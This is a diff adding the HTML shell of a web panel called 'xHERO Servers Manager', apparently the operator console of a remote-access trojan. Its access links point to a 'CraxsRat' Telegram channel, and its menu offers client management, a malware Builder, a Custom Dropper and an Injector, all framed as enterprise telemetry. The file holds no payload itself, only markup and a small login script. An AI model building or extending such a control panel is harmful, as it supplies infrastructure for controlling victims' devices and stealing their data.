@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>xHERO Servers Manager</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+</head>
+
+<body class="login-page">
+    <div id="login-screen" class="login-screen">
+        <div class="background-animation"></div>
+        <div class="background-3d"></div>
+        <div class="animated-ambient"></div>
+        <div class="grid-neon"></div>
+        <main class="login-shell">
+            <section class="login-showcase">
+                <div class="showcase-header">
+                    <span class="showcase-logo">xHERO</span>
+                    <span class="showcase-tagline">Operator Console</span>
+                </div>
+                <h1>Manage &amp; Monitor Remote Endpoints Securely</h1>
+                <p class="showcase-copy">
+                    Advanced telemetry, secure remote management, and incident response tooling in one centralized
+                    console.
+                </p>
+                <ul class="showcase-highlights">
+                    <li>Real-time session health and status monitoring</li>
+                    <li>Secure data retrieval and forensic export</li>
+                    <li>Alerting and prioritized incident workflows</li>
+                </ul>
+                <div class="showcase-footer">
+                    <div class="shield-indicator">
+                        <span class="shield-pulse"></span>
+                        <span>Protected by enterprise-grade authentication and audit logging</span>
+                    </div>
+                    <a class="contact-admin-link" href="https://t.me/CraxsRat_EU" target="_blank" rel="noopener">
+                        Request access or report an issue — contact admin
+                    </a>
+                </div>
+            </section>
+
+            <section class="login-card" aria-labelledby="login-title">
+                <div class="login-card-header">
+                    <h2 id="login-title">Secure Sign In</h2>
+                    <p>Authenticate with authorized administrator credentials to access the management console.</p>
+                </div>
+                <form id="login-form" novalidate>
+                    <div class="field-group">
+                        <label class="field-label" for="email">Email</label>
+                        <div class="field-control">
+                            <input type="email" id="email" name="email" autocomplete="email" required>
+                            <span class="field-focus-glow"></span>
+                        </div>
+                    </div>
+                    <div class="field-group">
+                        <label class="field-label" for="password">Password</label>
+                        <div class="field-control">
+                            <input type="password" id="password" name="password" autocomplete="current-password"
+                                required>
+                            <button type="button" class="password-toggle" aria-label="Toggle password visibility">
+                                <i class="material-icons">visibility</i>
+                            </button>
+                            <span class="field-focus-glow"></span>
+                        </div>
+                    </div>
+                    <div class="login-toolbar">
+                        <label class="remember-toggle">
+                            <input type="checkbox" id="login-remember">
+                            <span class="toggle-display"></span>
+                            <span class="toggle-label">Remember this device</span>
+                        </label>
+                        <a class="forgot-link" href="https://t.me/CraxsRat_EU" target="_blank" rel="noopener">Forgot
+                            credentials?</a>
+                    </div>
+                    <button type="submit" id="login-button">Sign In</button>
+                    <p id="login-error" role="alert" aria-live="polite"></p>
+                </form>
+                <footer class="login-footer">
+                    <span class="footer-title">Operator onboarding</span>
+                    <p>Access is restricted. Request provisioning directly via our Telegram channel.</p>
+                </footer>
+            </section>
+        </main>
+    </div>
+
+    <div class="main-container" id="panel-shell">
+        <aside class="sidebar">
+            <div class="sidebar-header">
+                <div class="logo-container">
+                    <span class="logo-letter" data-letter="x">x</span>
+                    <span class="logo-letter" data-letter="H">H</span>
+                    <span class="logo-letter" data-letter="E">E</span>
+                    <span class="logo-letter" data-letter="R">R</span>
+                    <span class="logo-letter" data-letter="O">O</span>
+                </div>
+            </div>
+            <div class="theme-switcher">
+                <button id="theme-menu-toggle" class="theme-gear" aria-haspopup="true" aria-expanded="false">
+                    <i class="material-icons">settings</i>
+                    <span>Themes</span>
+                </button>
+                <div id="theme-menu" class="theme-menu" role="menu">
+                    <button class="theme-option active" data-theme-value="default" role="menuitem">Neo Dark</button>
+                    <button class="theme-option" data-theme-value="aurora" role="menuitem">Aurora Mist</button>
+                    <button class="theme-option" data-theme-value="crimson" role="menuitem">Crimson Pulse</button>
+                    <button class="theme-option" data-theme-value="void" role="menuitem">Midnight Void</button>
+                    <button class="theme-option" data-theme-value="lumen" role="menuitem">Lumen White</button>
+                </div>
+            </div>
+            <nav class="sidebar-nav">
+                <ul>
+                    <li data-page="clients" class="active"><i class="material-icons">people</i> Clients</li>
+                    <li data-page="notifications"><i class="material-icons">notifications</i> Notifications</li>
+                    <li data-page="connections"><i class="material-icons">link</i> Connections</li>
+                    <li data-page="builder"><i class="material-icons">build</i> Builder</li>
+                    <li data-page="dropper"><i class="material-icons">palette</i> Custom Dropper</li>
+                    <li data-page="injector"><i class="material-icons">bolt</i> Pulse Injector</li>
+                    <li data-page="blocked"><i class="material-icons">block</i> Blocked</li>
+                    <li data-page="updates"><i class="material-icons">update</i> Updates</li>
+                    <li data-page="profile"><i class="material-icons">person</i> Profile</li>
+                    <li data-page="logout"><i class="material-icons">logout</i> Logout</li>
+                </ul>
+            </nav>
+        </aside>
+
+        <main class="content-area" id="main-content-area">
+            <!-- Content will be injected by JavaScript -->
+        </main>
+    </div>
+
+    <!-- Modal for Data Viewing -->
+    <div class="modal-overlay" id="data-modal" style="display:none;">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2 id="data-modal-title">Data</h2>
+                <button class="modal-close" id="data-modal-close">&times;</button>
+            </div>
+            <div id="data-modal-body">
+                <!-- Data will be loaded here -->
+            </div>
+        </div>
+    </div>
+
+    <!-- Confirmation Modal -->
+    <div class="modal-overlay" id="confirm-modal" style="display:none;">
+        <div class="confirm-modal-content">
+            <h3 id="confirm-modal-title">Are you sure?</h3>
+            <p id="confirm-modal-text"></p>
+            <div class="confirm-modal-actions">
+                <button id="confirm-modal-ok">OK</button>
+                <button id="confirm-modal-cancel">Cancel</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Image Lightbox -->
+    <div id="lightbox-overlay" class="lightbox-overlay">
+        <div class="lightbox-frame">
+            <img id="lightbox-image" alt="Preview">
+            <p id="lightbox-caption"></p>
+        </div>
+    </div>
+
+    <!-- Loading Loader -->
+    <div id="loading-overlay" class="loading-overlay">
+        <div class="loader-container">
+            <div class="neon-loader">
+                <div class="loader-ring"></div>
+                <div class="loader-ring"></div>
+                <div class="loader-ring"></div>
+                <div class="loader-dot"></div>
+            </div>
+            <p class="loader-text">Processing...</p>
+            <div class="progress-container">
+                <div class="progress-bar"></div>
+                <span class="progress-text">0%</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Centralized auth layer (handles Firebase sign-in / dev bypass) -->
+    <script type="module" src="auth.js"></script>
+    <script type="module" src="app.js"></script>
+    <script>
+        // Password toggle for login
+        const passwordToggle = document.querySelector('.password-toggle');
+        const passwordInput = document.getElementById('password');
+
+        if (passwordToggle && passwordInput) {
+            passwordToggle.addEventListener('click', () => {
+                const isPassword = passwordInput.type === 'password';
+                passwordInput.type = isPassword ? 'text' : 'password';
+                const icon = passwordToggle.querySelector('.material-icons');
+                if (icon) {
+                    icon.textContent = isPassword ? 'visibility_off' : 'visibility';
+                }
+                passwordToggle.setAttribute('aria-pressed', String(isPassword));
+            });
+        }
+    </script>
+</body>
+
+</html>
